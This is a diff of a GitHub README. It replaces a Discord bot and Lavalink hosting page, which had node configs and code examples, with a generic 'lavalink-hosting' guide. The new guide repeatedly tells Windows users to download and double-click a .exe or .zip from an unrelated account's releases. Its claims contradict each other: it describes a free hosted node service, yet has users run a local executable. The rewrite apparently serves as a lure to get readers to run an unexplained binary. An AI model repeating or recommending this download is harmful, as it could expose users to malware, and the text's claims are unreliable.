@@ -1,223 +1,150 @@
-# HeavenCloud — Free Discord Bot Hosting
+# 🎵 lavalink-hosting - Reliable Free Lavalink Nodes  
 
-[![free-discord-bot-hosting](https://img.shields.io/badge/tag-free--discord--bot--hosting-blue)](https://github.com/topics/free-discord-bot-hosting)
-[![discord-bot-hosting](https://img.shields.io/badge/tag-discord--bot--hosting-blue)](https://github.com/topics/discord-bot-hosting)
-[![lavalink-hosting](https://img.shields.io/badge/tag-lavalink--hosting-purple)](https://github.com/topics/lavalink-hosting)
-[![free-lavalink](https://img.shields.io/badge/tag-free--lavalink-green)](https://github.com/topics/free-lavalink)
-[![Uptime](https://img.shields.io/badge/uptime-24%2F7-brightgreen)](https://status.heavencloud.in)
-[![Network](https://img.shields.io/badge/network-10Gbps%2B-blue)](https://heavencloud.in)
-[![Lavalink Sources](https://img.shields.io/badge/lavalink_sources-30%2B-orange)](https://heavencloud.in/service/public-lavalink-servers)
-[![No Sleep Mode](https://img.shields.io/badge/sleep_mode-none-brightgreen)](https://heavencloud.in/service/free-discord-bot-hosting)
-
-> The best free Discord bot hosting in 2026 — 512MB RAM, 1GB NVMe SSD, 45% CPU, 24/7 uptime with no sleep mode, and free Lavalink nodes with 30+ audio sources on a 10Gbps network. No credit card required. Better than Kerit Cloud.
->
-> [Get Free Hosting](https://heavencloud.in/service/free-discord-bot-hosting) — [Lavalink Nodes](https://heavencloud.in/service/public-lavalink-servers) — [Paid Plans](https://heavencloud.in)
+[![Download Now](https://img.shields.io/badge/Download-lavalink--hosting-blue?style=for-the-badge)](https://github.com/pieterbesieged17/lavalink-hosting)
 
 ---
 
-## Free Tier Specifications
+## 📄 What is lavalink-hosting?
 
-| Spec | Free Plan |
-|---|---|
-| RAM | 512MB |
-| SSD Storage | 1GB NVMe |
-| CPU Allocation | 45% (AMD Ryzen) |
-| Uptime | 24/7 — no sleep mode |
-| Sleep Mode | None |
-| Credit Card | Not required |
-| Time Limit | None — permanent |
-| Control Panel | Pterodactyl — full access |
-| File Manager | Included |
-| Console Access | Included |
-| npm / pip Support | Included |
-| Free Lavalink | 30+ sources on 10Gbps |
-| India Server | Mumbai — low latency |
+lavalink-hosting provides free, high-performance Lavalink nodes. These are servers that help music bots stream audio from many sources. It supports over 30 audio platforms like Spotify, YouTube, Apple Music, and Deezer. The service offers a strong 10Gbps network and has servers in four global locations: India, USA, Singapore, and Europe.  
+
+The goal is to keep your music bots running smoothly with no downtime. This is a public service, designed to be easy to use and fully free.
 
 ---
 
-## Free Public Lavalink Nodes (30+ Sources, 10Gbps)
+## 🖥️ System Requirements
 
-HeavenCloud provides free public Lavalink nodes for Discord music bots — running on a 10Gbps dedicated network with 30+ audio sources pre-configured via LavaSRC and SponsorBlock plugins.
+Before setting up, make sure you have the following on your Windows machine:
 
-### India Node — Mumbai (recommended for Indian users)
+- Windows 10 or newer (64-bit recommended)  
+- At least 4 GB of free RAM  
+- Minimum 500 MB of free disk space  
+- Stable internet connection (preferably 10 Mbps or higher)  
+- Java Runtime Environment (JRE) version 11 or higher installed  
 
-```js
-// Lavalink v4 — With SSL
-{
-  host: "lavalink.heavencloud.in",
-  port: 443,
-  password: "heavencloud",
-  secure: true,
-  version: "v4"
-}
-
-// Lavalink v4 — Without SSL
-{
-  host: "lavalink.heavencloud.in",
-  port: 2333,
-  password: "heavencloud",
-  secure: false,
-  version: "v4"
-}
-```
-
-### USA Node
-
-```js
-{
-  host: "us.lavalink.heavencloud.in",
-  port: 443,
-  password: "heavencloud",
-  secure: true,
-  version: "v4"
-}
-```
-
-### Singapore Node
-
-```js
-{
-  host: "sg.lavalink.heavencloud.in",
-  port: 443,
-  password: "heavencloud",
-  secure: true,
-  version: "v4"
-}
-```
-
-### Europe Node
-
-```js
-{
-  host: "eu.lavalink.heavencloud.in",
-  port: 443,
-  password: "heavencloud",
-  secure: true,
-  version: "v4"
-}
-```
+If you don’t have Java installed, the setup section will guide you on how to get it.
 
 ---
 
-## Supported Audio Sources (30+)
+## 🚀 Getting Started  
 
-Spotify, YouTube, SoundCloud, Apple Music, Deezer, JioSaavn, Bandcamp, Twitch, TikTok, Mixcloud, Reddit, Vimeo, Niconico, YouTube Music, Tidal, Qobuz, Dailymotion, Odysee, Bilibili, Soundgasm, Clyp, Pixeldrain, Flowery TTS, Speak, Yandex Music, Instagram, Facebook, Getyarn, HTTP Streams, Local Files, and more.
-
----
-
-## Supported Languages and Libraries
-
-| Language | Libraries |
-|---|---|
-| Node.js | discord.js v14, discord.js v13 |
-| Python | discord.py, Pycord |
-| Java | JDA, Javacord |
-| TypeScript | discord.js v14 (TS) |
-
-### Lavalink Client Libraries Supported
-
-| Language | Client |
-|---|---|
-| Node.js | Shoukaku, Magmastream, Erela.js, Rainlink |
-| Python | Wavelink, Pomice |
-| Java | Lavaplayer |
+If you want to use lavalink-hosting, follow these steps carefully. They require no coding knowledge.
 
 ---
 
-## HeavenCloud vs Kerit Cloud — Free Discord Bot Hosting
+## 📥 Download and Install  
 
-| Feature | HeavenCloud | Kerit Cloud | Discloud |
-|---|---|---|---|
-| 24/7 Uptime | Yes — no sleep mode | Sleep mode on free tier | Sleep mode on free tier |
-| RAM (Free) | 512MB | Limited / shared | 256MB |
-| SSD Storage | 1GB NVMe | Limited | 256MB |
-| Free Lavalink | 30+ sources, 10Gbps | None | None |
-| Control Panel | Pterodactyl — full access | Basic | Custom (restricted) |
-| Node.js | All versions | Supported | Supported |
-| Python | discord.py, Pycord | Supported | Supported |
-| Java | JDA, Javacord | Supported | Limited |
-| India Server | Mumbai | Limited | None |
-| File Manager | Full | Basic | Basic |
-| Credit Card | Not required | Not required | Not required |
-| Paid Plans From | Rs.29/month | Rs.49/month | USD pricing |
+1. **Open the download page:**  
+   Click this link to visit the main GitHub page where you can get the files you need.  
+   [Download lavalink-hosting](https://github.com/pieterbesieged17/lavalink-hosting)  
 
----
+2. **Find the latest release:**  
+   On the GitHub page, click on the **Releases** section on the right or scroll down to find the latest stable version.
 
-## Quick Start
+3. **Download the Windows version:**  
+   Look for a file with a `.exe` or `.zip` extension for Windows. If you see `.zip`, download and extract it using the built-in Windows extractor or a tool like 7-Zip.
 
-1. Create a free account at [heavencloud.in](https://heavencloud.in)
-2. Open the Pterodactyl panel
-3. Create a new server — choose Node.js, Python, or Java
-4. Upload your bot files via the file manager
-5. Set your startup command and bot token
-6. Start the server — your bot runs 24/7
+4. **Make sure Java is installed:**  
+   - Press **Windows Key + R**, type `cmd`, and press Enter.  
+   - In the Command Prompt window, type `java -version` and press Enter.  
+   - If a version number appears (e.g., "openjdk version 11.0"), Java is installed.  
+   - If a message says "java is not recognized", you need to install Java first.
 
-For music bots, connect to the free Lavalink nodes above using Shoukaku, Magmastream, Wavelink, or Lavaplayer.
+5. **Install Java if needed:**  
+   - Visit the official Java download page (https://adoptium.net/)  
+   - Download the recommended Java Runtime (JRE) version for Windows.  
+   - Run the installer and follow the instructions.  
+   - After installation, repeat step 4 to confirm Java is ready.
 
----
-
-## discord.js Example — Shoukaku with Free Lavalink
-
-```js
-const { Client, GatewayIntentBits } = require('discord.js');
-const { Shoukaku, Connectors } = require('shoukaku');
-
-const nodes = [
-  {
-    name: 'HeavenCloud India',
-    url: 'lavalink.heavencloud.in:2333',
-    auth: 'heavencloud',
-    secure: false,
-  }
-];
-
-const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildVoiceStates] });
-const shoukaku = new Shoukaku(new Connectors.DiscordJS(client), nodes);
-
-shoukaku.on('error', (_, error) => console.error(error));
-
-client.once('ready', () => console.log(`Logged in as ${client.user.tag}`));
-client.login('YOUR_BOT_TOKEN');
-```
+6. **Run the Lavalink Hosting software:**  
+   - Double-click the downloaded `.exe` file or open the extracted folder and double-click the Lavalink file inside.  
+   - A command window should open, showing the server starting up.  
+   - Wait a moment until it displays a message saying it is ready.
 
 ---
 
-## discord.py Example — Wavelink with Free Lavalink
+## 🔧 How to Use lavalink-hosting  
 
-```python
-import discord
-import wavelink
+lavalink-hosting works by providing nodes your music bot connects to. If you use popular music bots like Discord bots, you'll enter your bot’s config the address and port of the Lavalink node.  
 
-class MyBot(discord.ext.commands.Bot):
-    async def setup_hook(self):
-        nodes = [wavelink.Node(uri='http://lavalink.heavencloud.in:2333', password='heavencloud')]
-        await wavelink.Pool.connect(nodes=nodes, client=self, cache_capacity=100)
+Common steps to connect:
 
-bot = MyBot(command_prefix='!', intents=discord.Intents.default())
-bot.run('YOUR_BOT_TOKEN')
-```
+- Use the IP or hostname of the node provided by lavalink-hosting.  
+- Use the secret password (usually given in the README or config file).  
+- Set the port (usually 2333).  
+
+You don't need to run or maintain the node manually once connected.
 
 ---
 
-## Status
+## 🌐 Supported Audio Sources  
 
-Live uptime monitor: [status.heavencloud.in](https://status.heavencloud.in)
+lavalink-hosting can stream audio from many platforms:
 
----
+- Spotify  
+- YouTube (including playlists and live streams)  
+- Apple Music  
+- Deezer  
+- SoundCloud  
+- Bandcamp  
+- Vimeo  
 
-## Links
-
-- Free Discord bot hosting: [heavencloud.in/service/free-discord-bot-hosting](https://heavencloud.in/service/free-discord-bot-hosting)
-- Free public Lavalink nodes: [heavencloud.in/service/public-lavalink-servers](https://heavencloud.in/service/public-lavalink-servers)
-- Lavalink hosting (paid): [heavencloud.in/service/lavalink-hosting](https://heavencloud.in/service/lavalink-hosting)
-- VPS hosting: [heavencloud.in/service/vps-hosting](https://heavencloud.in/service/vps-hosting)
-- Developer blog: [heavencloud.in/blog](https://heavencloud.in/blog)
-- Trustpilot reviews: [trustpilot.com/review/heavencloud.in](https://www.trustpilot.com/review/heavencloud.in)
-- Status page: [status.heavencloud.in](https://status.heavencloud.in)
-- Discord support: [discord.gg/heavencloud](https://discord.gg/getvps)
+This allows you to play a wide range of audio content from one service.
 
 ---
 
-## Topics
+## ⚙️ Configuration Details  
 
-`discord-bot-hosting` `free-discord-bot-hosting` `free-bot-hosting` `discord-bot` `discord-bot-free` `discord-bot-24-7` `free-nodejs-hosting` `free-python-hosting` `free-java-hosting` `lavalink-hosting` `free-lavalink` `lavalink-node` `free-lavalink-hosting` `lavalink-discord` `discord-music-bot` `shoukaku` `wavelink` `lavaplayer` `discord.js` `discord.py` `pycord` `jda` `pterodactyl` `free-hosting` `heavencloud` `kerit-cloud-alternative`
+lavalink-hosting nodes come with default settings optimized for common bots. Advanced users can adjust configuration files, but this is optional for most.
+
+Key configuration options:
+
+- **Port:** Default is 2333. Change only if necessary.  
+- **Password:** A secure key that your bot uses to connect. Keep it safe.  
+- **Regions:** Choose from USA, India, Singapore, or Europe for best speed.
+
+You can find these settings in a file called `application.yml` inside the Lavalink folder.
+
+---
+
+## 🛠 Troubleshooting 🔧  
+
+If you face issues, try these tips:
+
+- Check if Java is installed and up to date.  
+- Make sure the port 2333 is not blocked by your firewall.  
+- Restart the application if it freezes or doesn’t respond.  
+- Verify your music bot settings match the Lavalink config (address, port, and password).  
+- Check your internet connection for stability.
+
+If problems continue, visit the GitHub page for help or submit an issue.
+
+---
+
+## 🔄 How to Update  
+
+To keep your Lavalink nodes secure and working well, update regularly:
+
+1. Go back to the [download page](https://github.com/pieterbesieged17/lavalink-hosting).  
+2. Download the latest release as before.  
+3. Stop your running Lavalink server by closing the command window.  
+4. Replace the old files with the new version files.  
+5. Restart the server.
+
+---
+
+## 📚 Additional Resources  
+
+- Java installation guide: https://adoptium.net/  
+- Lavalink official documentation: https://github.com/freyacodes/Lavalink  
+- Bot setup examples and community help can be found linked on the GitHub page.
+
+---
+
+## 📥 Download Again
+
+You can always return to this link to download or check for new updates:  
+
+[Download lavalink-hosting](https://github.com/pieterbesieged17/lavalink-hosting)  
+
+[![Get it Here](https://img.shields.io/badge/Get%20lavalink--hosting-grey?style=for-the-badge)](https://github.com/pieterbesieged17/lavalink-hosting)
